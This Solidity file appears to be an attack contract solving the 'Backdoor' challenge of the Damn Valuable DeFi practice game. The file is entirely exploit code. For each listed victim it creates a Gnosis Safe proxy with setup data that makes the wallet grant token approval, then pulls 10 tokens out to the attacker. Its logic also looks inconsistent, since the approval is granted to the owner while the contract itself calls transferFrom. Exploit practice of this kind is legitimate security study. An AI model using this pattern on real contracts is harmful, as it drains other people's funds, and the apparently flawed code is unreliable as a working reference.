pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {
    GnosisSafeProxyFactory, GnosisSafeProxy, IProxyCreationCallback
} from "gnosis/proxies/GnosisSafeProxyFactory.sol";

contract AttackBackdoor {
    address _owner;
    DamnValuableToken _token;
    address _factory;
    address _masterCopy;
    address _walletRegistry;

    constructor(
        address owner,
        address masterCopy,
        address token,
        address factory,
        address walletRegistry,
        address[] memory vitims,
        bytes memory data
    ) {
        _owner = owner;
        _token = DamnValuableToken(token);
        _masterCopy = masterCopy;
        _factory = factory;
        _walletRegistry = walletRegistry;
        _token.approve(_owner, type(uint256).max);

        attack(vitims, data);
    }

    function setupToken() external {
        _token.approve(address(_owner), type(uint256).max);
    }

    function attack(address[] memory vitims, bytes memory data) public {
        require(msg.sender == _owner, "not owner");

        for (uint256 i = 0; i < vitims.length; i++) {
            address[] memory users = new address[](1);
            users[0] = vitims[i];

            string memory sign = "setup(address[],uint256,address,bytes,address,address,uint256,address)";

            bytes memory payload = abi.encodeWithSignature(
                sign, users, 1, address(this), data, address(0), address(0), uint256(0), address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_factory).createProxyWithCallback(
                _masterCopy, payload, 1, IProxyCreationCallback(address(_walletRegistry))
            );

            console.log("balance: ", _token.balanceOf(address(proxy)));

            _token.transferFrom(address(proxy), _owner, 10 ether);
        }
    }
}
